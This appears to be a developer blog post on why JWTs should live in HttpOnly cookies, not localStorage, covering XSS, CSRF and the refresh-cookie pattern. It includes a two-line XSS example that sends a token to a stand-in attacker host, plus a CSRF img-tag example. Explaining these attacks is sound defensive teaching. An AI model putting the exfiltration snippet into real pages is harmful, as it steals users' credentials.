# Why "Don't Store JWT in localStorage" — Auth History and the Cookie Return

**Published:** May 27, 2026  
**Tags:** Security, Authentication, JWT, Web, Full Stack

---

The rule has been repeated so many times it feels like dogma: *don't store JWT in localStorage*. But most developers who follow it couldn't explain the full chain of reasoning behind it — or why the industry is returning to cookies as the primary session mechanism.

This post walks through the history, the actual attack surfaces, and what a secure modern auth setup looks like.

## The localStorage Problem Is XSS

When you store a JWT in `localStorage`, any JavaScript running on your page can read it. That includes injected scripts from XSS attacks — either from your own code, a compromised third-party dependency, or a CDN you trust.

```javascript
// Any attacker-controlled JS running on your origin can do this:
const token = localStorage.getItem('access_token');
fetch('https://attacker.example.com/steal?t=' + token);
```

The attack surface is large. A single `eval()`, an unsanitized `dangerouslySetInnerHTML`, or a compromised npm package in your bundle is sufficient.

> [!WARNING]
> The problem isn't localStorage itself — it's that any JS on your origin has full read access to it. XSS turns this into a one-line credential exfiltration.

## Why localStorage Became Popular

Around 2014–2018, stateless JWTs became the default recommendation for SPAs. The logic was sound:

| Approach | Session storage | State required server-side |
|---|---|---|
| Session cookie | Server memory / Redis | Yes |
| JWT in cookie | Cookie jar | No (just signature verification) |
| JWT in localStorage | localStorage | No |

Stateless tokens meant horizontal scaling without sticky sessions or a shared Redis. Microservices liked that each service could verify a JWT independently without a network call to an auth server.

`localStorage` felt natural: no cookie configuration, no SameSite headaches, works across tabs, easily passed as `Authorization: Bearer`. Convenience, though, is not the same as security.

## Why HttpOnly Cookies Are Safer

An `HttpOnly` cookie cannot be read by JavaScript — at all. `document.cookie` returns nothing for it. The browser sends it automatically with same-origin requests, but no script on the page can read or exfiltrate the value.

```http
Set-Cookie: session=<token>; HttpOnly; Secure; SameSite=Strict; Path=/
```

The relevant flags:

| Flag | Effect |
|---|---|
| `HttpOnly` | JS cannot read via `document.cookie` |
| `Secure` | Only transmitted over HTTPS |
| `SameSite=Strict` | Never sent on cross-site requests |
| `SameSite=Lax` | Sent on top-level navigations, not cross-site sub-resource requests |

## The CSRF Trade-off

The objection to cookies is CSRF — Cross-Site Request Forgery. A cookie is automatically sent with every request to your origin, so a malicious site can trigger state-changing requests by embedding:

```html
<!-- On evil.example.com -->
<img src="https://yourapp.com/api/transfer?amount=1000&to=attacker">
```

The browser attaches your session cookie when loading that "image".

Modern mitigations have largely closed this gap:

1. **`SameSite=Strict`** — cookie never sent cross-site. Most robust, but breaks OAuth redirect flows
2. **`SameSite=Lax`** — default in modern browsers. Sent on top-level navigations, not on cross-site sub-resource requests or form POSTs. Neutralizes the `<img>` attack above
3. **CSRF tokens** — server issues a random token per session; frontend reads it via a separate non-HttpOnly cookie or meta tag and includes it in mutation requests

For most applications, `SameSite=Lax` + `HttpOnly` is the pragmatic baseline that handles both XSS-based token theft and the common CSRF patterns.

## The Modern Pattern

The industry has settled back on cookies for persistent auth. JWTs haven't disappeared — most systems still use them — but where they live has changed:

```
[Login] → Server issues:
  - Short-lived access JWT (5–15 min) 
      → returned in response body
      → stored in JS memory only (never persisted)

  - Long-lived refresh token
      → Set-Cookie: refresh=<token>; HttpOnly; Secure; SameSite=Lax

[API call]
  → Authorization: Bearer <access JWT from memory>

[Access JWT expires]
  → POST /auth/refresh
  → Refresh cookie sent automatically by browser
  → Server validates, issues new access JWT in response body
  → New JWT stored in memory
```

This pattern gives you:

- **No XSS-readable persistent token** — access JWT in JS memory is gone on tab close / page refresh
- **HttpOnly refresh cookie** — XSS cannot read or steal it
- **SameSite=Lax** — CSRF protection without custom token infrastructure
- **Short-lived access JWT** — compromise window limited to the token TTL

> [!TIP]
> For server-side rendered applications (Next.js App Router, for example), consider the BFF (Backend for Frontend) pattern: the access JWT never touches the browser at all. It lives exclusively in server-side state, and the browser only ever has an `HttpOnly` session cookie that the BFF exchanges for the token internally.

## What's Actually at Risk

The risks aren't theoretical. Real supply chain attacks on npm packages have exfiltrated tokens from `localStorage`. The 2023 Polyfill.io compromise injected malicious scripts into millions of sites without the affected teams knowing.

With `localStorage`, that injected script reads the token and sends it to an attacker's server. With an `HttpOnly` cookie, the same injected script cannot read the token. It can still make authenticated requests in the user's current session (session hijacking), but it cannot exfiltrate a credential that works after the session ends or from a different browser.

The distinction matters: `HttpOnly` cookies eliminate *credential theft* (the attacker taking the token somewhere else), not *session abuse* (the attacker acting within the current session). For most threat models — especially protecting API tokens that are valid beyond the current page load — eliminating credential theft is the higher-value protection.

## Key Takeaways

- `localStorage` is readable by any JS on your origin — XSS turns it into a credential theft vector
- `HttpOnly` cookies prevent JS from reading the token at all, eliminating the most common exfiltration pattern
- `SameSite=Lax` handles the majority of CSRF scenarios without additional token infrastructure
- The modern pattern: short-lived access JWT in memory + long-lived `HttpOnly` refresh cookie
- For SSR apps, consider keeping the access token server-side entirely and never exposing it to browser JS
